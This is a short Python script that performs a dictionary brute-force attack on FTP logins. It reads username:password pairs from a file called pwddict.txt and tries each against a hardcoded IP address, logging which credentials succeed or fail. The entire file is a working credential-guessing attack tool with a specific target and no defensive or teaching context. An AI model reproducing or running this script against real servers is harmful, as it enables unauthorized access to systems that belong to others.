#!/usr/bin/python
#coding:utf-8
import ftplib
import logging
import logging.config
filename=''
logging.config.fileConfig('./logconfig.ini')
__log = logging.getLogger('product')

def ftpconn(host,filename):
    fp = open(filename,'r')
    for line in fp.readlines():
        __log.debug(line)
        if not line.strip('\r').strip('\n'):
            __log.debug("遍历完毕，脚本退出")
            break; 
        loginname = line.split(':')[0]
        loginpwd = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftpconn = ftplib.FTP(host,timeout=2)
            ftpconn.login(loginname, loginpwd)
            __log.debug("%s login sucess",host)
            ftpconn.quit()
            #return True
        except Exception as e:
            __log.debug("login %s failed,name:%s,pwd:%s, ,error info %s",host,loginname,loginpwd,str(e))
            #return False
def main():
    global filename
    filename = 'pwddict.txt'
    ftpconn('166.111.174.33',filename)
if __name__ == '__main__':
    main()
